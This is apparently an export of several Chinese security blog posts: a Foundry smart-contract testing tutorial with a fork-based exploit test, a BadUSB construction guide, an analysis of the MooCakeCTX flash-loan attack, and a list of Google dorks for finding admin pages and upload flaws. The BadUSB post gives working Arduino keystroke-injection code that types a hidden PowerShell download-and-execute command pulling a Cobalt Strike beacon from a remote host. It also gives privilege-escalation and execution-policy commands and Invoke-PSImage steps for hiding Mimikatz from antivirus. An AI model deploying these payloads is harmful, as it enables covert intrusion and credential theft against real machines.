<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="c1">//导入std的包来输出信息，导入测试用的包, /forge-std/src/test/console.sol</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">stdStorage</span><span class="p">,</span> <span class="nx">StdStorage</span><span class="p">,</span> <span class="nx">Test</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="c1">//这2个文件继承了DStest里面有许多使用的函数，创建，断言等等</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Utils</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">./utils/Utils.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">MyERC20</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../MyERC20.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">BaseSetup</span> <span class="nx">is</span> <span class="nx">MyERC20</span><span class="p">,</span> <span class="nx">Test</span> <span class="p">{</span>
    <span class="nx">Utils</span> <span class="nx">internal</span> <span class="nx">utils</span><span class="p">;</span>
    <span class="nx">address</span> <span class="nx">payable</span><span class="p">[]</span> <span class="nx">internal</span> <span class="nx">users</span><span class="p">;</span>

    <span class="nx">address</span> <span class="nx">internal</span> <span class="nx">alice</span><span class="p">;</span>
    <span class="nx">address</span> <span class="nx">internal</span> <span class="nx">bob</span><span class="p">;</span>
    <span class="c1">//Forge中的setUp关键字在每个测试用例运行之前调用的可选函数</span>
    <span class="c1">//还有其他关键词作为函数命名的前缀，test作为测试用例，testFail等等</span>
    <span class="kd">function</span> <span class="nx">setUp</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">virtual</span> <span class="p">{</span>
        <span class="nx">utils</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Utils</span><span class="p">();</span> <span class="c1">//初始化Utils</span>
        <span class="nx">users</span> <span class="o">=</span> <span class="nx">utils</span><span class="p">.</span><span class="nx">createUsers</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span> <span class="c1">//调用创建方法可以创建2个账户</span>

        <span class="nx">alice</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">//在vm中加标签，在堆栈跟踪容易识别</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nx">label</span><span class="p">(</span><span class="nx">alice</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Alice</span><span class="dl">"</span><span class="p">);</span> <span class="c1">//关于VM众多功能的查看 forge-std/src/Vm.sol</span>
        <span class="nx">bob</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nx">label</span><span class="p">(</span><span class="nx">bob</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Bob</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">WhenTransferringTokens</span> <span class="nx">is</span> <span class="nx">BaseSetup</span> <span class="p">{</span>
    <span class="nx">uint256</span> <span class="nx">internal</span> <span class="nx">maxTransferAmount</span> <span class="o">=</span> <span class="mi">12</span><span class="nx">e18</span><span class="p">;</span>
    <span class="c1">//类似于beforeEach和describe</span>
    <span class="kd">function</span> <span class="nx">setUp</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">virtual</span> <span class="nx">override</span> <span class="p">{</span>
        <span class="nx">BaseSetup</span><span class="p">.</span><span class="nx">setUp</span><span class="p">();</span> <span class="c1">//调用BaseSetup初始化账户</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">When transferring tokens</span><span class="dl">"</span><span class="p">);</span><span class="c1">//使用console.log来打印日志信息</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nx">transferToken</span><span class="p">(</span>
        <span class="nx">address</span> <span class="k">from</span><span class="p">,</span>
        <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span>
        <span class="nx">uint256</span> <span class="nx">transferAmount</span>
    <span class="p">)</span> <span class="kr">public</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="k">from</span><span class="p">);</span> <span class="c1">//prank(address),将所有后续调用的 msg.sender 设置为输入地址</span>
        <span class="c1">//因为prank修改了调用者，这里使用的this</span>
        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">to</span><span class="p">,</span> <span class="nx">transferAmount</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">WhenAliceHasSufficientFunds</span> <span class="nx">is</span> <span class="nx">WhenTransferringTokens</span> <span class="p">{</span>
    <span class="nx">using</span> <span class="nx">stdStorage</span> <span class="k">for</span> <span class="nx">StdStorage</span><span class="p">;</span>
    <span class="nx">uint256</span> <span class="nx">internal</span> <span class="nx">mintAmount</span> <span class="o">=</span> <span class="nx">maxTransferAmount</span><span class="p">;</span>
    <span class="c1">//before初始化</span>
    <span class="kd">function</span> <span class="nx">setUp</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">override</span> <span class="p">{</span>
        <span class="nx">WhenTransferringTokens</span><span class="p">.</span><span class="nx">setUp</span><span class="p">();</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">When Alice has sufficient funds</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">_mint</span><span class="p">(</span><span class="nx">alice</span><span class="p">,</span> <span class="nx">mintAmount</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nx">itTransfersAmountCorrectly</span><span class="p">(</span>
        <span class="nx">address</span> <span class="k">from</span><span class="p">,</span>
        <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span>
        <span class="nx">uint256</span> <span class="nx">transferAmount</span>
    <span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">uint256</span> <span class="nx">fromBalanceBefore</span> <span class="o">=</span> <span class="nx">balanceOf</span><span class="p">(</span><span class="k">from</span><span class="p">);</span>
        <span class="nx">bool</span> <span class="nx">success</span> <span class="o">=</span> <span class="nx">transferToken</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">transferAmount</span><span class="p">);</span>
        <span class="c1">// src/test/utils，forge-std中也有，断言函数有相等小于大于(eq,le,ge)  assertTrue判断返回值</span>
        <span class="nx">assertTrue</span><span class="p">(</span><span class="nx">success</span><span class="p">);</span>
        <span class="nx">assertEqDecimal</span><span class="p">(</span>
            <span class="nx">balanceOf</span><span class="p">(</span><span class="k">from</span><span class="p">),</span>
            <span class="nx">fromBalanceBefore</span> <span class="o">-</span> <span class="nx">transferAmount</span><span class="p">,</span>
            <span class="nx">decimals</span><span class="p">()</span>
        <span class="p">);</span>
        <span class="nx">assertEqDecimal</span><span class="p">(</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">to</span><span class="p">),</span> <span class="nx">transferAmount</span><span class="p">,</span> <span class="nx">decimals</span><span class="p">());</span>
    <span class="p">}</span>
    <span class="c1">//带参调用</span>
    <span class="kd">function</span> <span class="nx">testTransferAllTokens</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">itTransfersAmountCorrectly</span><span class="p">(</span><span class="nx">alice</span><span class="p">,</span> <span class="nx">bob</span><span class="p">,</span> <span class="nx">maxTransferAmount</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nx">testTransferHalfTokens</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">itTransfersAmountCorrectly</span><span class="p">(</span><span class="nx">alice</span><span class="p">,</span> <span class="nx">bob</span><span class="p">,</span> <span class="nx">maxTransferAmount</span> <span class="o">/</span> <span class="mi">2</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nx">testTransferOneToken</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">itTransfersAmountCorrectly</span><span class="p">(</span><span class="nx">alice</span><span class="p">,</span> <span class="nx">bob</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nx">testTransferWithFuzzing</span><span class="p">(</span><span class="nx">uint64</span> <span class="nx">transferAmount</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nx">assume</span><span class="p">(</span><span class="nx">transferAmount</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
        <span class="nx">itTransfersAmountCorrectly</span><span class="p">(</span>
            <span class="nx">alice</span><span class="p">,</span>
            <span class="nx">bob</span><span class="p">,</span>
            <span class="nx">transferAmount</span> <span class="o">%</span> <span class="nx">maxTransferAmount</span>
        <span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">//签名打包的方式判断，感觉实际上用的很少，这里使用了mockcall模拟调用，如果调用成功会返回ture，使用完之后清空模拟</span>
    <span class="kd">function</span> <span class="nx">testTransferWithMockedCall</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">alice</span><span class="p">);</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nx">mockCall</span><span class="p">(</span>
            <span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span>
            <span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSelector</span><span class="p">(</span>
                <span class="k">this</span><span class="p">.</span><span class="nx">transfer</span><span class="p">.</span><span class="nx">selector</span><span class="p">,</span>
                <span class="nx">bob</span><span class="p">,</span>
                <span class="nx">maxTransferAmount</span>
            <span class="p">),</span>
            <span class="nx">abi</span><span class="p">.</span><span class="nx">encode</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span>
        <span class="p">);</span>
        <span class="nx">bool</span> <span class="nx">success</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">bob</span><span class="p">,</span> <span class="nx">maxTransferAmount</span><span class="p">);</span>
        <span class="nx">assertTrue</span><span class="p">(</span><span class="o">!</span><span class="nx">success</span><span class="p">);</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nx">clearMockedCalls</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="c1">//vm.load(地址，byte32数据)，从状态读取数据。</span>
    <span class="kd">function</span> <span class="nx">testFindMapping</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">uint256</span> <span class="nx">slot</span> <span class="o">=</span> <span class="nx">stdstore</span>
            <span class="p">.</span><span class="nx">target</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span>
            <span class="p">.</span><span class="nx">sig</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">.</span><span class="nx">selector</span><span class="p">)</span>
            <span class="p">.</span><span class="nx">with_key</span><span class="p">(</span><span class="nx">alice</span><span class="p">)</span>
            <span class="p">.</span><span class="nx">find</span><span class="p">();</span>
        <span class="nx">bytes32</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">load</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="nx">bytes32</span><span class="p">(</span><span class="nx">slot</span><span class="p">));</span>
        <span class="nx">assertEqDecimal</span><span class="p">(</span><span class="nx">uint256</span><span class="p">(</span><span class="nx">data</span><span class="p">),</span> <span class="nx">mintAmount</span><span class="p">,</span> <span class="nx">decimals</span><span class="p">());</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>做一个带有输入变量的测试函数，forge 会自动进行模糊测试vm.assume排除值，modulo限制为某个值</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function testTransferFuzzing(uint64 amount) public {
    vm.assume(amount != 0);
    itTransfersAmountCorrectly(
        alice,
        bob,
        amount % maxTransferAmount
    );
}
</code></pre></div></div>

<p>依据V数量不同打印不同级别的告警信息。</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>forge test -vvvvv
</code></pre></div></div>
<p>2: 打印所有测试的日志
3: 打印失败的测试的执行堆栈
4: 打印所有测试的执行堆栈，以及失败测试的 setup 堆栈
5: 打印所有测试的执行和 setup 堆栈</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221121hardhat/6.png" alt="1" /></p>
  </li>
</ul>

<p>其余功能非常多结合漏洞分析一起使用。</p>

<h4 id="foundry-模拟攻击">foundry 模拟攻击</h4>

<p>需要配置RPC</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpc_endpoints = { 
    mainnet = "https://rpc.ankr.com/eth", 
    optimism = "https://rpc.ankr.com/optimism" , 
    fantom = "https://rpc.ankr.com/fantom", 
    arbitrum = "https://rpc.ankr.com/arbitrum", 
    bsc = "https://rpc.ankr.com/bsc", 
    moonriver = "https://moonriver.public.blastapi.io", 
    gnosis = "https://rpc.ankr.com/gnosis", 
    avax = "https://rpc.ankr.com/avalanche", 
    polygon = "https://rpc.ankr.com/polygon", 
    eth_goerli="https://rpc.ankr.com/eth_goerli"
}
</code></pre></div></div>

<p>链fork区块状态</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function setUp() public {
    cheats.createSelectFork("bsc", 22832427);
}
</code></pre></div></div>

<p>示例代码</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

interface Ft {
    function Flag() external returns(bool);
}

contract testFoundry is DSTest {
    //0x71097是固定的修改地址，不能更改。
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address constant Flag = 0x7067222c38268E25E53Fb00aBe6D652EBd38d213;

    function setUp() public{
        cheats.createSelectFork("eth_goerli",8053179);
        console.log("is fork?");
    }

    function testExploit() public{
        console.log("***start***");
        //测试网中部署的测试合约
        bool suc = Ft(0x7067222c38268E25E53Fb00aBe6D652EBd38d213).Flag();
        require(suc, "fLAG = false");
        console.log("***end***");
    }

}
</code></pre></div></div>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221121hardhat/8.png" alt="1" /></p>
  </li>
</ul>

<p>测试exp</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>forge test --contracts ./src/test/MooCAKECTX_exp.sol -vvvvv
</code></pre></div></div>

<p>(待更新)</p>

<h4 id="tenderly模拟执行">Tenderly模拟执行</h4>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221121hardhat/7.png" alt="1" /></p>
  </li>
</ul>]]></content><author><name>true</name></author><category term="hardhat" /><summary type="html"><![CDATA[hardhat&amp;foundry自动化合约部署与测试，模拟攻击]]></summary></entry><entry><title type="html">BadUsb HID</title><link href="http://localhost:4000/2022/11/17/BadUsb.html" rel="alternate" type="text/html" title="BadUsb HID" /><published>2022-11-17T11:21:00+08:00</published><updated>2022-11-17T11:21:00+08:00</updated><id>http://localhost:4000/2022/11/17/BadUsb</id><content type="html" xml:base="http://localhost:4000/2022/11/17/BadUsb.html"><![CDATA[<p>author: by Anoxia<br />
check: by yako33</p>

<h4 id="hid原理">HID原理：</h4>
<p>利用HID进行攻击，将USB设备伪装使电脑识别为键盘，利用模拟键盘或者针脚爆破的方式强行攻击，最为常见的方式badusb，或者可以使用其他typec设备对android等设备进行针脚暴力破解等，其中针对badusb有2种制作方向，一种是usb的驱动加载来实现，一种是模拟键盘操作加载来实现，两种方式的目的都是为了突破验证手段。</p>

<h4 id="漏洞产生原因">漏洞产生原因：</h4>
<p>USB设备通常在加载时所要求的权限并不高，行为也很难被识别，所以系统的安全防护软件通常对这类硬件设备的检测力度不够严格，即使在工业生产中所使用的防护设备通常以USB只读的方式运行，但仍然可以通过插入usb设备时的加载文件进行Bypass</p>

<h4 id="前期准备">前期准备：</h4>
<p>准备ATTINY85 Digispark(Attiny85)微型USB开发板(本文中作者使用的设备)，如图：</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/1.png" alt="1" /></p>
  </li>
</ul>

<p>使用该设备需要安装驱动，博主更加推荐的设备为Arduino Leonardo (Atmega32u4)，但价格会更高一些。</p>

<p>同时可以选择的开发板为
Arduino Micro (Atmega32u4)
Chineese Arduino Leonardo clones (Atmega32u4)
Teensy 2.0 (Atmega32u4)
Phoenix Ovipositor (Atmega32u4)</p>

<h4 id="arduino-ide环境配置">arduino ide环境配置：</h4>
<p>打开文件-&gt;首选项，在附加开发板管理器中添加地址：<a href="https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json">https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json</a></p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/3.png" alt="3" /></p>
  </li>
</ul>

<p>然后选择开发板管理器，进去后会自动下载索引，如果未下载成功，开启科学上网重新下载</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/4.png" alt="4" /></p>
  </li>
</ul>

<p>然后搜索 “Digistump AVR Boards by Digistump”  进行安装,再在开发板中选择 Digispark（Default-16.5mhz）</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/5.png" alt="5" /></p>
  </li>
</ul>

<p>再选择开发板</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/6.png" alt="6" /></p>
  </li>
</ul>

<h4 id="badusb制作">BadUsb制作：</h4>
<p>利用cs生成一个ps1的木马文件，使用ps1文件的原因是因为目前windows系统中普遍支持Powershell，并且可以直接在命令行中运行，测试起来比较方便，实际攻击过程中可能还是会使用标准的木马文件。此处为了方便测试简单监听在vps上用python（python2 -m SimpleHTTPServer 8888）起一个http服务把这个木马文件放上去,具体使用的方式非常多样。</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/7.png" alt="7" /></p>
  </li>
</ul>

<p><br />需要将以下代码烧录进开发板中,将ip换成刚才的vps服务器的</p>

<pre><code class="language-arduino">#include "DigiKeyboard.h"		//定义使用虚拟键盘函数库
#define KEY_ESC     41
#define KEY_BACKSPACE 42
#define KEY_TAB     43
#define KEY_PRT_SCR 70
#define KEY_DELETE  76

//在初始化中运行，意思是在插入读取时运行
void setup() {

DigiKeyboard.sendKeyStroke(0);
//延时，等待确保执行完成
DigiKeyboard.delay(1000);	
//上面这两个输入是windows键+r键盘
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);	
//延时	
DigiKeyboard.delay(1000);	
//输入powershell的弹shell的代码（要绕杀毒需做免杀）
DigiKeyboard.print(F("powershell -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString('http://ip:port/beacon.ps1');"));	
DigiKeyboard.delay(500);
//输入enter键盘
DigiKeyboard.sendKeyStroke(KEY_ENTER);	
DigiKeyboard.delay(750);
DigiKeyboard.sendKeyStroke(KEY_ENTER);

}
void loop() {
  //主逻辑循环这里未使用所以没有编写，可以在此处完成后渗透维权相关操作。
}
</code></pre>
<p>将代码复制到arduinoide进行烧录，点击上传后看到下面这样的代表编译成功。然后在60秒内插入BadUsb进行烧录</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/8.png" alt="8" /></p>
  </li>
</ul>

<p>这样就代表烧录成功了，拔下来然后就可以使用了</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/9.png" alt="9" /></p>
  </li>
</ul>

<h4 id="实际过程中的注意点">实际过程中的注意点：</h4>
<p>关于静默执行部分：</p>

<p>在模拟键盘操作部分可以添加下面的命令，来更好的命中</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//powershell中开启管理员权限，此处没有隐藏窗口，需要自行添加
<span class="nb">start</span><span class="na">-process </span><span class="kd">PowerShell</span> <span class="na">-verb </span><span class="nb">runas</span>
//以cmd中以管理员打开powershell
<span class="kd">powershell</span> <span class="nb">start</span><span class="na">-process </span><span class="kd">powershell</span> <span class="na">-verb </span><span class="nb">runas</span>
//部分windows由于，默认不开启ps1执行，在管理员权限下执行
//可以先获取当前权限，如果编写判断，如果权限不足可以设置如RemoteSigned/Restricted
<span class="kd">Get</span><span class="na">-ExecutionPolicy
</span>//设置权限为无认证可以执行
<span class="kd">set</span><span class="na">-executionpolicy -executionpolicy </span><span class="kd">unrestricted</span>
//在选择中选择A，全是
<span class="kd">A</span>
//接下来继续执行后门链接操作。
</code></pre></div></div>
<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/10.png" alt="10" /></p>
  </li>
</ul>

<p>关于ps1免杀部分：</p>

<p>一种可以使用免杀混淆(推荐这种，目前主要使用)，一种是直接使用键盘命令，使用arduino重构指令(比较麻烦也算是种思路)。</p>

<p>使用<a href="https://github.com/peewpw/Invoke-PSImage">Invoke-PSImage</a>免杀，官方的使用说明中已经说的非常清楚了，使用也很简单(位图免杀混淆此处不讨论。)</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS&gt;Import-Module .\Invoke-PSImage.ps1
//这里可以使用"-WebRequest"生成URL的请求
PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg
</code></pre></div></div>

<p>值得注意的是，在Invoke-PSImage中可能会遇到生成文件过大失败的情况，而在cs生成的ps1中有很多代码都在if判断中不会被执行可以删除，删除之后可以解决这个问题。</p>

<p>另一种为自己写代码实现自己想要输入的键盘命令,部分代码,如果使用键盘重构可以打乱编码顺序进行混淆，下面是参考网上的代码作为布局参考:</p>
<pre><code class="language-arduino">#定义或头相关
#ifndef __DigiKeyboard_h__
...
#include "scancode-ascii-table.h"
#定义类型
...
#重构键盘
PROGMEM char usbHidReportDescriptor[USB_CFG_HID_REPORT_DESCRIPTOR_LENGTH] = { /* USB report descriptor */
  0x05, 0x01,                    // USAGE_PAGE (Generic Desktop) 
  0x09, 0x06,                    // USAGE (Keyboard) 
...
  0x29, 0x65,                    //   USAGE_MAXIMUM (Keyboard Application) 
  0x81, 0x00,                    //   INPUT (Data,Ary,Abs) 
  0xc0                           // END_COLLECTION 
};

#define MOD_CONTROL_LEFT    (1&lt;&lt;0)
...
#define MOD_GUI_RIGHT       (1&lt;&lt;7)

#define KEY_A       4
...
#define KEY_F12     69

//自定义键盘类，并在初始化中完成操作
class DigiKeyboardDevice : public Print {
 public:
  DigiKeyboardDevice () {
    cli();
    usbDeviceDisconnect();
    _delay_ms(250);
    usbDeviceConnect();
    usbInit();     
    sei();
    memset(reportBuffer, 0, sizeof(reportBuffer));      
    usbSetInterrupt(reportBuffer, sizeof(reportBuffer));
  }
    
  void update() {
    usbPoll();
  }
	
...
//实例化
DigiKeyboardDevice DigiKeyboard = DigiKeyboardDevice();
...
</code></pre>]]></content><author><name>true</name></author><category term="HID" /><category term="badusb" /><summary type="html"><![CDATA[author: by Anoxia check: by yako33]]></summary></entry><entry><title type="html">MooCakeCTX attack</title><link href="http://localhost:4000/2022/11/07/MooCakeCTX-attack.html" rel="alternate" type="text/html" title="MooCakeCTX attack" /><published>2022-11-07T11:45:00+08:00</published><updated>2022-11-07T11:45:00+08:00</updated><id>http://localhost:4000/2022/11/07/MooCakeCTX-attack</id><content type="html" xml:base="http://localhost:4000/2022/11/07/MooCakeCTX-attack.html"><![CDATA[<p>[TOC]</p>

<p>thanks by KRlyx &amp; Deft (beosin security team)</p>

<p>MooCakeCTX合约遭到闪电贷攻击，首位攻击者获得约14万美元，第二位攻击者获利约47万美元，2次攻击手法一致，MooCakeTWT于MooCakeCTX数小时后被攻击。</p>

<h4 id="事件地址信息">事件地址信息</h4>

<p>攻击交易<br />
https://bscscan.com/tx/0x03d363462519029cf9a544d44046cad0c7e64c5fb1f2adf5dd5438a9a0d2ec8e</p>

<p>攻击者地址<br />
0x35700c4a7bd65048f01d6675f09d15771c0facd5</p>

<p>攻击合约<br />
0x71Ac864f9388eBD8e55a3cdBC501D79C3810467C</p>

<p>被攻击合约地址<br />
0x489afbAED0Ea796712c9A6d366C16CA3876D8184</p>

<h4 id="漏洞分析">漏洞分析</h4>
<p>本次攻击主要利用了抵押奖励合约中，抵押和奖励没有时间等相关的限制，并且对于调用者的防范不够全面，导致攻击者可以利用闪电贷放大分红收益，获取MooCakeCTX</p>

<h4 id="攻击流程">攻击流程</h4>
<p>1.在攻击交易0x03d363462我们可以看到2022-11-06 09:30:38 PM +UTC时攻击者利用闪电贷发起攻击,攻击者先使用闪电贷借出BUSD并把自己的钱与借入的钱一起换成vBUSD后再兑换成CAKE币用做抵押的准备资金，因为在StrategySyrup中只能使用cake币作为抵押，所以这里全部换成了cake币。而同时准备CTK币，为了smartchef能够抵押调用成功进行的转账。</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221107MooCakeCTX/1.png" alt="1" /></p>
    <p></p>
    <p><img src="http://localhost:4000/screenshot/20221107MooCakeCTX/2.png" alt="2" /></p>
  </li>
</ul>

<p>2.而在具体的攻击流程函数调用中我们可以看到当，当攻击者调用deposit函数后立马使用call调用了harvest函数，而这里的调用地址是一个攻击合约并且在最后看到此合约已经自毁。我们可以看到在图中harvest函数代码中，对调用地址是否是EOA地址做了判断，但当发起调用在构造函数的情况下iscontract()可以被绕过从而实现了合约调用，这是此次攻击的核心之一。</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221107MooCakeCTX/3.png" alt="3" /></p>
    <p></p>
    <p><img src="http://localhost:4000/screenshot/20221107MooCakeCTX/4.png" alt="4" /></p>
  </li>
</ul>

<p>3.接着就是此次攻击的问题所在，BeefyVault合约中由于奖励计算根据所占的抵押份额计算，其中更新奖励又是按照账户调用harvest函数进行更新，那么在一次更新领取奖励的轮次中，只要所占份额越大，获利越多，所以攻击者用闪电贷放大了收益(而上一次在733天前)，并且绕过了iscontract使用合约调用，值得注意的是这里的depositAll和withdrawAll中与时间没有关系，所以攻击者可以在depoist后立马调用withdrawAll领取奖励。</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221107MooCakeCTX/5.png" alt="5" /></p>
    <p></p>
    <p><img src="http://localhost:4000/screenshot/20221107MooCakeCTX/6.png" alt="6" /></p>
  </li>
</ul>

<p>4.攻击者又执行了两次相同手法的攻击，并归还了闪电贷,获利424 BNB(约14万)离场。并且攻击者因为操作步骤出错WBNB没有转出。</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221107MooCakeCTX/7.png" alt="7" /></p>
  </li>
</ul>

<h3 id="moocakectx-exp细节解析">MooCakeCTX exp细节解析</h3>

<p>(待更新)</p>]]></content><author><name>true</name></author><category term="blockchain" /><category term="flashloan" /><category term="hacker" /><summary type="html"><![CDATA[[TOC]]]></summary></entry><entry><title type="html">information-Gathering</title><link href="http://localhost:4000/2021/12/13/Information-Gathering.html" rel="alternate" type="text/html" title="information-Gathering" /><published>2021-12-13T17:16:00+08:00</published><updated>2021-12-13T17:16:00+08:00</updated><id>http://localhost:4000/2021/12/13/Information-Gathering</id><content type="html" xml:base="http://localhost:4000/2021/12/13/Information-Gathering.html"><![CDATA[<p>[TOC]</p>

<h2 id="google语法">google语法</h2>

<p>也许你想在bash/python中继承一些搜索苦于寻找关键词写法，本文或许可以帮你。</p>

<h4 id="网站后缀">网站后缀</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms
</code></pre></div></div>
<h4 id="文本内容">文本内容</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username
</code></pre></div></div>
<h4 id="可注入点">可注入点</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>site:域名 inurl:aspx|jsp|php|asp
</code></pre></div></div>
<h4 id="上传漏洞">上传漏洞</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>site:域名 inurl:file|load|editor|Files
</code></pre></div></div>
<h4 id="eweb编辑器">eweb编辑器</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit
</code></pre></div></div>
<h4 id="存在的数据库">存在的数据库</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>site:域名 filetype:mdb|asp|#
</code></pre></div></div>
<h4 id="查看脚本类型">查看脚本类型</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>site:域名 filetype:asp/aspx/php/jsp
